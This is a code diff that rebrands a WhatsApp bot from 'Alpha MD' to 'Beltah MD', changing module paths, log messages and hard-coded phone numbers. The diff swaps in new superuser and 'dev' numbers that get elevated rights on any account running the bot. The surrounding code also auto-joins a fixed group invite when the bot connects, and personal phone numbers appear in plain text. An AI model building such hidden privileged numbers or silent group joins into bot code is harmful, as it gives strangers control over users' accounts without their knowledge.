@@ -75,7 +75,7 @@ const {
   atbverifierEtatJid,
   atbrecupererActionJid
 } = require("./bdd/antibot");
-let evt = require(__dirname + "/keizzah/keith");
+let evt = require(__dirname + "/framework/zokou");
 const {
   isUserBanned,
   addUserToBanList,
@@ -91,10 +91,10 @@ const {
   addGroupToOnlyAdminList,
   removeGroupFromOnlyAdminList
 } = require("./bdd/onlyAdmin");
-//const //{loadCmd}=require("/keizzah/mesfonctions")
+//const //{loadCmd}=require("/framework/mesfonctions")
 let {
   reagir
-} = require(__dirname + "/keizzah/app");
+} = require(__dirname + "/framework/app");
 var session = conf.session.replace(/ALPHA-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE || [];
 
@@ -631,10 +631,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254748387615", '254737130240', '254737681758', "254114141192", '254112150793', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254112150793', '254737681758', "254114141192", '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -1164,7 +1164,7 @@ if (texte && texte.startsWith('>')) {
 
       //execution des commandes   
       if (verifCom) {
-        const cd = evt.cm.find(keith => keith.nomCom === com || keith.nomCom === com || keith.aliases && keith.aliases.includes(com));
+        const cd = evt.cm.find(zokou => zokou.nomCom === com || zokou.nomCom === com || zokou.aliases && zokou.aliases.includes(com));
         if (cd) {
           try {
             if (conf.MODE.toLocaleLowerCase() != 'yes' && !superUser) {
@@ -1362,7 +1362,7 @@ if (texte && texte.startsWith('>')) {
         connection
       } = con;
       if (connection === "connecting") {
-        console.log("ℹ️ Alpha md connecting in your account...");
+        console.log("ℹ️ Beltah md connecting in your account...");
       } else if (connection === 'open') {
         await zk.groupAcceptInvite("DvXonepPp1XBPOYIBziTl1");
         console.log("✅ Alpha Md connected successfully✔");
@@ -1376,11 +1376,11 @@ if (texte && texte.startsWith('>')) {
         console.log(" Alpha-md installing ${evt.cm.length} plugins😇\n\n");
         //chargement des commandes 
         console.log("chargement des commands ...\n");
-        fs.readdirSync(__dirname + "/commands").forEach(fichier => {
+        fs.readdirSync(__dirname + "/plugins").forEach(fichier => {
           if (path.extname(fichier).toLowerCase() == ".js") {
             try {
-              require(__dirname + "/commands/" + fichier);
-              console.log(fichier + "Successfully installed Alpha Md commands✔️");
+              require(__dirname + "/plugins/" + fichier);
+              console.log(fichier + "Successfully installed Beltah Md commands✔️");
             } catch (e) {
               console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
             } /* require(__dirname + "/commands/" + fichier);
@@ -1399,7 +1399,7 @@ if (texte && texte.startsWith('>')) {
         } else {
           md = "undefined";
         }
-        console.log("Alpha md successfully connected✅");
+        console.log("Beltah md successfully connected✅");
         await activateCrons();
 const getGreeting = () => {
         const currentHour = DateTime.now().setZone('Africa/Nairobi').hour;
